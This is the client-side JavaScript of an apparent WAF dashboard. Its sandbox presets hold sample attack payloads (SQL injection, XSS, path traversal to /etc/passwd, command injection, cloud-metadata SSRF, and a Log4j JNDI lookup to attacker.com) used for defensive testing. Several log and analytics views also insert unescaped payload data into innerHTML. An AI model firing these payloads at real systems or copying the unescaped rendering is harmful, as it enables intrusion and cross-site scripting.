// ============================================================
// Bastion WAF Dashboard — Application Logic
// ============================================================

let cachedRules = [];
let activeRuleCategory = 'ALL';
let trafficChartInstance = null;
let threatChartInstance = null;

// ---- Theme ----
function getTheme() {
    return document.documentElement.getAttribute('data-theme') || 'dark';
}

function toggleTheme() {
    const next = getTheme() === 'dark' ? 'light' : 'dark';
    document.documentElement.setAttribute('data-theme', next);
    localStorage.setItem('bastion-theme', next);
    applyChartTheme();
}

function restoreTheme() {
    const saved = localStorage.getItem('bastion-theme');
    if (saved) {
        document.documentElement.setAttribute('data-theme', saved);
    }
}

function getThemeColors() {
    const s = getComputedStyle(document.documentElement);
    return {
        grid: s.getPropertyValue('--chart-grid').trim(),
        tick: s.getPropertyValue('--chart-tick').trim(),
        legend: s.getPropertyValue('--chart-legend').trim(),
        accent: s.getPropertyValue('--accent').trim(),
        danger: s.getPropertyValue('--danger').trim(),
    };
}

function applyChartTheme() {
    const c = getThemeColors();
    if (trafficChartInstance) {
        const opts = trafficChartInstance.options;
        opts.scales.x.grid.color = c.grid;
        opts.scales.x.ticks.color = c.tick;
        opts.scales.y.grid.color = c.grid;
        opts.scales.y.ticks.color = c.tick;
        opts.plugins.legend.labels.color = c.legend;
        trafficChartInstance.data.datasets[0].borderColor = c.accent;
        trafficChartInstance.data.datasets[0].backgroundColor = c.accent + '14';
        trafficChartInstance.data.datasets[1].borderColor = c.danger;
        trafficChartInstance.data.datasets[1].backgroundColor = c.danger + '14';
        trafficChartInstance.update('none');
    }
    if (threatChartInstance) {
        threatChartInstance.options.plugins.legend.labels.color = c.legend;
        threatChartInstance.update('none');
    }
}

// ---- Navigation ----
function switchNav(tabId, el) {
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));

    const pane = document.getElementById('pane-' + tabId);
    if (pane) pane.classList.add('active');
    if (el) el.classList.add('active');

    if (tabId === 'sites') fetchSites();
    if (tabId === 'rules') fetchRules();
    if (tabId === 'logs') fetchAuditLogs();
    if (tabId === 'system') fetchSystem();
}

// ---- Modals ----
function openModal(id) { document.getElementById(id).classList.add('active'); }
function closeModal(id) { document.getElementById(id).classList.remove('active'); }

function showToast(msg) {
    const t = document.getElementById('toast');
    document.getElementById('toast-msg').textContent = msg;
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 2400);
}

function escapeHtml(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// ---- Command Palette ----
window.addEventListener('keydown', (e) => {
    if ((e.metaKey || e.ctrlKey) && e.key === 'k') {
        e.preventDefault();
        openCmdPalette();
    }
    if (e.key === 'Escape') {
        closeCmdPalette();
        closeModal('inspectModal');
        closeModal('addSiteModal');
    }
});

function openCmdPalette() {
    openModal('cmdPaletteModal');
    setTimeout(() => document.getElementById('cmdPaletteInput').focus(), 50);
}
function closeCmdPalette() { closeModal('cmdPaletteModal'); }

function execCmd(action) {
    closeCmdPalette();
    if (action === 'clear-logs') clearAuditLogs();
    else {
        const navItem = document.querySelector(`.nav-item[onclick*="${action}"]`);
        switchNav(action, navItem);
    }
}

function filterCmdPalette(e) {
    const q = document.getElementById('cmdPaletteInput').value.toLowerCase();
    document.querySelectorAll('.cmd-item').forEach(item => {
        item.style.display = item.textContent.toLowerCase().includes(q) ? 'flex' : 'none';
    });
}

// ---- Protected Sites ----
async function fetchSites() {
    const tbody = document.getElementById('sites-tbody');
    if (!tbody) return;
    try {
        const res = await fetch('/api/sites');
        const sites = await res.json();
        renderSites(sites);
    } catch (e) {
        tbody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: var(--danger); padding: 24px;">Failed to load protected sites.</td></tr>';
    }
}

function renderSites(sites) {
    const tbody = document.getElementById('sites-tbody');
    if (!tbody) return;

    if (!sites || sites.length === 0) {
        tbody.innerHTML = `
            <tr>
                <td colspan="5" style="text-align: center; padding: 48px 20px;">
                    <div style="font-size: 2.2rem; color: var(--accent); margin-bottom: 12px;">
                        <i class="fa-solid fa-satellite-dish"></i>
                    </div>
                    <div style="font-size: 1rem; font-weight: 600; color: var(--text-primary); margin-bottom: 6px;">
                        No Protected Sites Configured
                    </div>
                    <div style="font-size: 0.82rem; color: var(--text-muted); max-width: 440px; margin: 0 auto 16px auto; line-height: 1.5;">
                        Bastion WAF is operating as an independent inspection gateway on port 8080. Add a site to proxy clean traffic to an upstream application.
                    </div>
                    <button class="btn btn-primary" onclick="openModal('addSiteModal')">
                        <i class="fa-solid fa-plus"></i> Add Protected Site
                    </button>
                </td>
            </tr>
        `;
        return;
    }

    tbody.innerHTML = sites.map(s => {
        const isDefenseActive = s.defense_mode !== 0 && s.defense_mode !== false;
        return `
            <tr>
                <td>
                    <div style="display: flex; align-items: center; gap: 8px;">
                        <i class="fa-solid fa-globe text-accent"></i>
                        <span style="font-family: var(--font-mono); font-weight: 600; color: var(--text-primary);">${escapeHtml(s.domain)}</span>
                    </div>
                </td>
                <td>
                    <span style="font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-secondary);">
                        <i class="fa-solid fa-arrow-right" style="font-size: 0.7rem; margin-right: 4px; color: var(--text-muted);"></i>${escapeHtml(s.upstream)}
                    </span>
                </td>
                <td>
                    <span class="badge ${isDefenseActive ? 'badge-green' : 'badge-amber'}">
                        ${isDefenseActive ? '<i class="fa-solid fa-shield"></i> Protected' : '<i class="fa-solid fa-eye"></i> Bypass'}
                    </span>
                </td>
                <td>
                    <label class="switch">
                        <input type="checkbox" ${isDefenseActive ? 'checked' : ''} onchange="toggleSiteDefense(${s.id}, this.checked)">
                        <span class="slider"></span>
                    </label>
                </td>
                <td style="text-align: right;">
                    <button class="btn btn-outline" style="padding: 4px 10px; font-size: 0.76rem; color: var(--danger); border-color: rgba(229, 72, 77, 0.3);" onclick="deleteSite(${s.id}, '${escapeHtml(s.domain)}')">
                        <i class="fa-solid fa-trash"></i>
                    </button>
                </td>
            </tr>
        `;
    }).join('');
}

async function toggleSiteDefense(siteId, enabled) {
    try {
        const res = await fetch('/api/sites', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ site_id: siteId, defense_mode: enabled }),
        });
        if (res.ok) {
            showToast(enabled ? 'Site defense active' : 'Site switched to bypass mode');
            fetchSites();
        } else {
            showToast('Failed to update defense mode');
        }
    } catch (e) {
        showToast('Network error updating defense mode');
    }
}

async function deleteSite(siteId, domain) {
    if (!confirm(`Are you sure you want to remove ${domain}?`)) return;
    try {
        const res = await fetch(`/api/sites/${siteId}`, { method: 'DELETE' });
        if (res.ok) {
            showToast(`Removed ${domain}`);
            fetchSites();
        } else {
            showToast('Failed to delete site');
        }
    } catch (e) {
        showToast('Network error deleting site');
    }
}

async function submitNewSite() {
    const domainInput = document.getElementById('newSiteDomain');
    const upstreamInput = document.getElementById('newSiteUpstream');
    const domain = domainInput.value.trim();
    const upstream = upstreamInput.value.trim();

    if (!domain || !upstream) {
        showToast('Please fill out both domain and upstream');
        return;
    }

    try {
        const res = await fetch('/api/sites', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ domain: domain, upstream: upstream }),
        });
        if (res.ok) {
            closeModal('addSiteModal');
            domainInput.value = '';
            upstreamInput.value = '';
            showToast(`Added site ${domain}`);
            fetchSites();
        } else {
            const data = await res.json().catch(() => ({}));
            showToast(data.message || 'Failed to add site');
        }
    } catch (e) {
        showToast('Network error adding site');
    }
}

// ---- Rules ----
function filterRuleCategory(cat, btn) {
    activeRuleCategory = cat;
    document.querySelectorAll('.rule-cat-btn').forEach(b => {
        b.classList.remove('btn-primary');
        b.classList.add('btn-outline');
    });
    if (btn) {
        btn.classList.remove('btn-outline');
        btn.classList.add('btn-primary');
    }
    renderRules();
}

function renderRules() {
    const container = document.getElementById('rules-container');
    if (!container) return;
    const searchVal = (document.getElementById('rule-search-input')?.value || '').toLowerCase();

    const filtered = cachedRules.filter(r => {
        const matchCat = (activeRuleCategory === 'ALL' || r.category === activeRuleCategory);
        const matchSearch = (!searchVal || r.rule_name.toLowerCase().includes(searchVal) || r.rule_id.includes(searchVal));
        return matchCat && matchSearch;
    });

    if (filtered.length === 0) {
        container.innerHTML = `<div style="text-align: center; color: var(--text-muted); padding: 36px;">No rules match your search.</div>`;
        return;
    }

    container.innerHTML = filtered.map(r => {
        const catBadge = r.category === 'OWASP Top 10' ? 'badge-red' : (r.category === 'API Security' ? 'badge-cyan' : 'badge-amber');
        return `
        <div style="display: flex; justify-content: space-between; align-items: center; background: var(--bg-input); border: 1px solid var(--border); padding: 12px 16px; border-radius: var(--radius-md); transition: border-color 0.12s;" onmouseenter="this.style.borderColor='var(--border-hover)'" onmouseleave="this.style.borderColor='var(--border)'">
            <div>
                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 2px;">
                    <strong style="font-size: 0.88rem; color: var(--text-primary);">${r.rule_name}</strong>
                    <span class="badge ${catBadge}">${r.category}</span>
                </div>
                <div style="font-size: 0.74rem; font-family: var(--font-mono); color: var(--text-muted);">${r.rule_id}</div>
            </div>
            <label class="switch">
                <input type="checkbox" ${r.enabled ? 'checked' : ''} onchange="toggleRule('${r.rule_id}', this.checked)">
                <span class="slider"></span>
            </label>
        </div>`;
    }).join('');
}

async function fetchRules() {
    try {
        const res = await fetch('/api/rules');
        cachedRules = await res.json();
        document.getElementById('rule-count-badge').textContent = cachedRules.length;

        const countOWASP = cachedRules.filter(r => r.category === 'OWASP Top 10').length;
        const countAPI = cachedRules.filter(r => r.category === 'API Security').length;
        const countBot = cachedRules.filter(r => r.category === 'Bot Protection').length;

        const btns = document.querySelectorAll('.rule-cat-btn');
        if (btns.length >= 4) {
            btns[0].innerHTML = `<i class="fa-solid fa-layer-group"></i> All (${cachedRules.length})`;
            btns[1].innerHTML = `<i class="fa-solid fa-shield-halved text-danger"></i> OWASP Top 10 (${countOWASP})`;
            btns[2].innerHTML = `<i class="fa-solid fa-plug text-accent"></i> API Security (${countAPI})`;
            btns[3].innerHTML = `<i class="fa-solid fa-robot text-warning"></i> Bot Protection (${countBot})`;
        }

        renderRules();
    } catch (err) { console.error(err); }
}

async function toggleRule(ruleId, isChecked) {
    try {
        await fetch('/api/rules', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ rule_id: ruleId, enabled: isChecked })
        });
        showToast(`Rule ${ruleId}: ${isChecked ? 'Enabled' : 'Disabled'}`);
    } catch (err) { console.error(err); }
}

// ---- Sandbox ----
function setSandboxPreset(type) {
    const method = document.getElementById('sb-method');
    const path = document.getElementById('sb-path');
    const query = document.getElementById('sb-query');
    const body = document.getElementById('sb-body');

    const presets = {
        sqli:  { m: 'GET', p: '/search',   q: "q=admin' OR '1'='1", b: '' },
        xss:   { m: 'GET', p: '/comment',  q: "msg=<script>alert('XSS')</script>", b: '' },
        lfi:   { m: 'GET', p: '/file',     q: 'name=../../../../etc/passwd', b: '' },
        rce:   { m: 'GET', p: '/exec',     q: 'cmd=cat /etc/passwd; id', b: '' },
        ssrf:  { m: 'GET', p: '/fetch',    q: 'url=http://169.254.169.254/latest/meta-data/', b: '' },
        ssti:  { m: 'GET', p: '/render',   q: 'name={{7*7}}', b: '' },
        log4j: { m: 'GET', p: '/api',      q: 'user=${jndi:ldap://attacker.com/exploit}', b: '' },
        clean: { m: 'GET', p: '/products', q: 'category=electronics&limit=10', b: '' },
    };
    const p = presets[type] || presets.clean;
    method.value = p.m; path.value = p.p; query.value = p.q; body.value = p.b;
    runSandboxSimulation();
}

async function runSandboxSimulation() {
    const resultBox = document.getElementById('sandbox-result-container');
    const method = document.getElementById('sb-method').value;
    const path = document.getElementById('sb-path').value;
    const query_string = document.getElementById('sb-query').value;
    const body = document.getElementById('sb-body').value;

    resultBox.innerHTML = `<div style="text-align: center; margin: auto;"><i class="fa-solid fa-spinner fa-spin" style="font-size: 1.6rem; color: var(--accent);"></i><p style="margin-top: 8px; color: var(--text-muted);">Evaluating…</p></div>`;

    try {
        const res = await fetch('/api/simulate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ method, path, query_string, body, headers: { 'user-agent': 'Bastion-Sandbox-Tester/1.0' } })
        });
        const data = await res.json();

        const verdictBadge = data.blocked
            ? '<span class="badge badge-red" style="font-size: 0.85rem;"><i class="fa-solid fa-ban"></i> Blocked</span>'
            : (data.action === 'CHALLENGE'
                ? '<span class="badge badge-amber" style="font-size: 0.85rem;"><i class="fa-solid fa-puzzle-piece"></i> Challenge</span>'
                : '<span class="badge badge-green" style="font-size: 0.85rem;"><i class="fa-solid fa-check"></i> Allowed</span>');

        const scoreColor = data.total_score >= 5 ? 'var(--danger)' : (data.total_score >= 2.5 ? 'var(--warning)' : 'var(--success)');

        resultBox.innerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); padding-bottom: 10px;">
                <div>
                    <span style="font-size: 0.72rem; color: var(--text-muted); display: block;">Decision</span>
                    ${verdictBadge}
                </div>
                <div style="text-align: right;">
                    <span style="font-size: 0.72rem; color: var(--text-muted); display: block;">Anomaly Score</span>
                    <strong style="font-size: 1.2rem; font-family: var(--font-mono); color: ${scoreColor};">${data.total_score || 0} / 10</strong>
                </div>
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; background: var(--bg-input); padding: 10px; border-radius: var(--radius-sm); font-size: 0.78rem;">
                <div><span style="color: var(--text-muted);">Rule score:</span> <strong style="color: var(--text-primary);">${data.rule_score || 0}</strong></div>
                <div><span style="color: var(--text-muted);">Semantic score:</span> <strong style="color: var(--accent);">${data.semantic_score || 0}</strong></div>
                <div style="grid-column: span 2;"><span style="color: var(--text-muted);">Archetype:</span> <span style="color: var(--warning);">${data.semantic_category || 'None'}</span></div>
            </div>

            <div>
                <span style="font-size: 0.74rem; color: var(--text-muted); display: block; margin-bottom: 3px;">Analysis</span>
                <div style="background: var(--bg-input); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 10px; font-size: 0.82rem; color: var(--accent);">
                    ${data.reason || 'No threat signatures detected.'}
                </div>
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
                <div>
                    <span style="font-size: 0.7rem; color: var(--text-muted); display: block; margin-bottom: 2px;">Raw input</span>
                    <pre style="background: var(--terminal-bg); border: 1px solid var(--border); padding: 8px; border-radius: 6px; font-size: 0.72rem; color: var(--text-secondary); max-height: 60px; overflow: auto; white-space: pre-wrap;">${data.raw_payload || 'N/A'}</pre>
                </div>
                <div>
                    <span style="font-size: 0.7rem; color: var(--text-muted); display: block; margin-bottom: 2px;">Normalized</span>
                    <pre style="background: var(--terminal-bg); border: 1px solid var(--accent-border); padding: 8px; border-radius: 6px; font-size: 0.72rem; color: var(--accent); max-height: 60px; overflow: auto; white-space: pre-wrap;">${data.normalized_payload || 'N/A'}</pre>
                </div>
            </div>
        `;

        // Instantly refresh telemetry, live charts, and incident feed from database
        pollTelemetry();
    } catch (err) {
        resultBox.innerHTML = `<div style="color: var(--danger); text-align: center; margin: auto;">Error — check console.</div>`;
    }
}

// ---- Live Threat Vectors & Targeted Endpoints ----
function renderThreatAnalytics(analytics) {
    if (!analytics) return;

    const badge = document.getElementById('threat-unique-badge');
    if (badge) {
        badge.innerHTML = `<i class="fa-solid fa-network-wired"></i> ${analytics.unique_ips || 0} Client IPs`;
    }

    // 1. Top targeted paths
    const pathsList = document.getElementById('analytics-top-paths');
    if (pathsList) {
        const paths = analytics.top_paths || [];
        if (paths.length === 0) {
            pathsList.innerHTML = `<div style="text-align: center; color: var(--text-muted); padding: 18px;">No targeted endpoints recorded yet.</div>`;
        } else {
            const maxHits = Math.max(...paths.map(p => p.total), 1);
            pathsList.innerHTML = paths.map(p => {
                const pct = Math.round((p.total / maxHits) * 100);
                return `
                    <div class="analytics-item">
                        <div style="display: flex; align-items: center; gap: 8px;">
                            <span class="badge ${p.blocked > 0 ? 'badge-red' : 'badge-green'}">${p.blocked > 0 ? 'Blocked' : 'Clean'}</span>
                            <code style="color: var(--text-primary); font-size: 0.8rem;">${p.path}</code>
                        </div>
                        <div class="analytics-meter-wrap">
                            <div class="analytics-meter-bar">
                                <div class="analytics-meter-fill ${p.blocked > 0 ? 'danger' : ''}" style="width: ${pct}%;"></div>
                            </div>
                            <div style="font-family: var(--font-mono); font-size: 0.74rem; min-width: 48px; text-align: right;">
                                <strong style="color: ${p.blocked > 0 ? 'var(--danger)' : 'var(--accent)'};">${p.total}</strong>
                                <span style="color: var(--text-muted); font-size: 0.68rem;">reqs</span>
                            </div>
                        </div>
                    </div>
                `;
            }).join('');
        }
    }

    // 2. Top triggered rules
    const rulesGrid = document.getElementById('analytics-top-rules');
    if (rulesGrid) {
        const rules = analytics.top_rules || [];
        if (rules.length === 0) {
            rulesGrid.innerHTML = `<div style="color: var(--text-muted); font-size: 0.74rem;">No rule triggers recorded yet.</div>`;
        } else {
            rulesGrid.innerHTML = rules.map(r => `
                <div class="analytics-rule-card">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <span class="badge badge-red" style="font-size: 0.68rem;">${r.rule_id}</span>
                        <strong style="color: var(--danger); font-family: var(--font-mono); font-size: 0.78rem;">${r.count}x</strong>
                    </div>
                    <div style="font-size: 0.72rem; color: var(--text-secondary); font-weight: 500; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">${r.name}</div>
                </div>
            `).join('');
        }
    }

    // 3. Active client IPs (real IPs, no fake countries)
    const ipsList = document.getElementById('analytics-top-ips');
    if (ipsList) {
        const ips = analytics.top_ips || [];
        if (ips.length === 0) {
            ipsList.innerHTML = `<div style="color: var(--text-muted); font-size: 0.74rem;">No active clients recorded yet.</div>`;
        } else {
            ipsList.innerHTML = ips.map(i => `
                <div class="analytics-ip-chip">
                    <i class="fa-solid fa-laptop text-accent"></i>
                    <code>${i.ip}</code>
                    <span style="color: ${i.blocked > 0 ? 'var(--danger)' : 'var(--text-muted)'}; font-weight: 600;">(${i.total} reqs)</span>
                </div>
            `).join('');
        }
    }
}

// ---- Charts ----
function initCharts() {
    const c = getThemeColors();

    trafficChartInstance = new Chart(document.getElementById('trafficChart').getContext('2d'), {
        type: 'line',
        data: {
            labels: ['-60s', '-50s', '-40s', '-30s', '-20s', '-10s', 'Now'],
            datasets: [
                {
                    label: 'Clean',
                    data: [0, 0, 0, 0, 0, 0, 0],
                    borderColor: c.accent,
                    backgroundColor: c.accent + '14',
                    borderWidth: 2,
                    tension: 0.4,
                    fill: true,
                    pointRadius: 0,
                },
                {
                    label: 'Blocked',
                    data: [0, 0, 0, 0, 0, 0, 0],
                    borderColor: c.danger,
                    backgroundColor: c.danger + '14',
                    borderWidth: 2,
                    tension: 0.4,
                    fill: true,
                    pointRadius: 0,
                }
            ]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: { legend: { labels: { color: c.legend, font: { size: 11 }, boxWidth: 12 } } },
            scales: {
                x: { grid: { color: c.grid }, ticks: { color: c.tick, font: { size: 10 } } },
                y: { grid: { color: c.grid }, ticks: { color: c.tick, font: { size: 10 } } }
            }
        }
    });

    threatChartInstance = new Chart(document.getElementById('threatCategoryChart').getContext('2d'), {
        type: 'doughnut',
        data: {
            labels: ['OWASP Top 10', 'API Security', 'Bot Protection'],
            datasets: [{
                data: [15, 7, 6], // default active rule distribution
                backgroundColor: ['#e5484d', '#3ecfb4', '#e5a435'],
                borderWidth: 0,
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: {
                    position: 'bottom',
                    labels: { color: c.legend, font: { size: 11 }, boxWidth: 12, padding: 14 }
                }
            },
            cutout: '72%',
        }
    });
}

// ---- Telemetry ----
async function pollTelemetry() {
    try {
        const res = await fetch('/api/stats');
        const stats = await res.json();

        document.getElementById('stat-total-requests').textContent = stats.total_requests;
        document.getElementById('stat-blocked-attacks').textContent = stats.blocked_attacks;
        document.getElementById('stat-challenged-requests').textContent = stats.challenged_requests || 0;
        document.getElementById('stat-latency').textContent = (stats.latency_ms || 0.38) + ' ms';

        const pct = stats.total_requests > 0 ? ((stats.blocked_attacks / stats.total_requests) * 100).toFixed(1) : '0';
        document.getElementById('stat-block-pct').textContent = pct + '%';

        // Real traffic from database timeline
        if (trafficChartInstance && stats.traffic) {
            trafficChartInstance.data.datasets[0].data = stats.traffic.clean;
            trafficChartInstance.data.datasets[1].data = stats.traffic.blocked;
            trafficChartInstance.update('none');
        }

        // Real threat categories from database
        if (threatChartInstance && stats.categories) {
            const catBadge = document.getElementById('category-chart-badge');
            const tc = stats.categories.threat_counts || {};
            const rc = stats.categories.rule_counts || { 'OWASP Top 10': 15, 'API Security': 7, 'Bot Protection': 6 };
            const totalThreats = stats.categories.total_threats || 0;

            if (totalThreats > 0) {
                // Show real threats that were blocked
                threatChartInstance.data.datasets[0].data = [
                    tc['OWASP Top 10'] || 0,
                    tc['API Security'] || 0,
                    tc['Bot Protection'] || 0
                ];
                if (catBadge) {
                    catBadge.textContent = `${totalThreats} Mitigated`;
                    catBadge.className = 'badge badge-red';
                }
            } else {
                // Show active rules protection suite
                threatChartInstance.data.datasets[0].data = [
                    rc['OWASP Top 10'] || 15,
                    rc['API Security'] || 7,
                    rc['Bot Protection'] || 6
                ];
                if (catBadge) {
                    catBadge.textContent = '28 Active Rules';
                    catBadge.className = 'badge badge-purple';
                }
            }
            threatChartInstance.update('none');
        }

        // Real Threat Vectors & Analytics (no geo)
        if (stats.analytics) {
            renderThreatAnalytics(stats.analytics);
        }

        fetchRecentEvents();
    } catch (err) { console.error(err); }
}

async function fetchRecentEvents() {
    try {
        const res = await fetch('/api/events');
        const events = await res.json();
        const feed = document.getElementById('live-incident-feed');
        if (!feed) return;

        if (!events || events.length === 0) {
            feed.innerHTML = `<div style="text-align: center; color: var(--text-muted); padding: 40px;">No recent incidents</div>`;
            return;
        }

        feed.innerHTML = events.slice(0, 5).map(e => `
            <div style="display: flex; align-items: center; justify-content: space-between; background: var(--bg-input); border: 1px solid var(--border); padding: 8px 10px; border-radius: var(--radius-sm); font-size: 0.78rem;">
                <div style="display: flex; align-items: center; gap: 7px;">
                    <span class="badge ${e.blocked ? 'badge-red' : (e.action.includes('Challenged') ? 'badge-amber' : 'badge-green')}">${e.action}</span>
                    <code style="color: var(--accent); font-size: 0.72rem;">${e.client_ip}</code>
                    <span style="color: var(--text-muted); max-width: 120px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">${e.path}</span>
                </div>
                <span style="font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-muted);">${e.timestamp.split(' ')[1] || e.timestamp}</span>
            </div>
        `).join('');
    } catch (err) { console.error(err); }
}

// ---- Audit Logs ----
async function fetchAuditLogs() {
    const query = document.getElementById('log-search-query').value;
    const threat = document.getElementById('log-threat-type').value;

    try {
        const res = await fetch(`/api/logs?q=${encodeURIComponent(query)}&threat=${encodeURIComponent(threat)}`);
        const logs = await res.json();
        const tbody = document.getElementById('audit-log-body');

        if (!logs || logs.length === 0) {
            tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted);">No logs found</td></tr>`;
            return;
        }

        tbody.innerHTML = logs.map(l => {
            const encoded = encodeURIComponent(JSON.stringify(l));
            const badgeClass = l.blocked ? 'badge-red' : (l.action.includes('Challenged') ? 'badge-amber' : 'badge-green');
            return `
                <tr>
                    <td style="font-family: var(--font-mono); font-size: 0.76rem;">${l.timestamp}</td>
                    <td><code>${l.client_ip}</code></td>
                    <td>${l.path}</td>
                    <td><span class="badge ${l.blocked ? 'badge-red' : 'badge-amber'}">${l.rule_id || '—'}</span></td>
                    <td><span class="badge ${badgeClass}">${l.action}</span></td>
                    <td>
                        <button class="btn btn-outline" style="padding: 2px 7px; font-size: 0.72rem;" onclick="inspectPayload('${encoded}')">
                            <i class="fa-solid fa-eye"></i>
                        </button>
                    </td>
                </tr>
            `;
        }).join('');
    } catch (err) { console.error(err); }
}

function inspectPayload(encodedJson) {
    try {
        const data = JSON.parse(decodeURIComponent(encodedJson));
        document.getElementById('modal-time').textContent = data.timestamp;
        document.getElementById('modal-ip').textContent = data.client_ip;
        document.getElementById('modal-path').textContent = data.path;
        document.getElementById('modal-rule').textContent = data.rule_id || '—';
        document.getElementById('modal-reason').textContent = data.reason;
        document.getElementById('modal-payload').textContent = data.payload_snippet || 'No payload captured';
        openModal('inspectModal');
    } catch (e) { console.error(e); }
}

async function clearAuditLogs() {
    if (!confirm('Clear all security logs?')) return;
    try {
        await fetch('/api/logs/clear', { method: 'POST' });
        fetchAuditLogs();
        pollTelemetry();
        showToast('Logs cleared');
    } catch (err) { console.error(err); }
}

function exportLogsCsv() {
    window.location.href = '/api/export/csv';
}

// ---- System ----
async function fetchSystem() {
    try {
        const res = await fetch('/api/system');
        const data = await res.json();
        document.getElementById('sys-cpu').textContent = data.cpu_percent + '%';
        document.getElementById('sys-ram').textContent = data.ram_used_mb + ' MB';
        document.getElementById('sys-uptime').textContent = data.uptime;
    } catch (err) { console.error(err); }
}

// ---- Init ----
window.addEventListener('DOMContentLoaded', () => {
    restoreTheme();
    initCharts();
    fetchRules();
    pollTelemetry();
    setInterval(pollTelemetry, 3000);
});
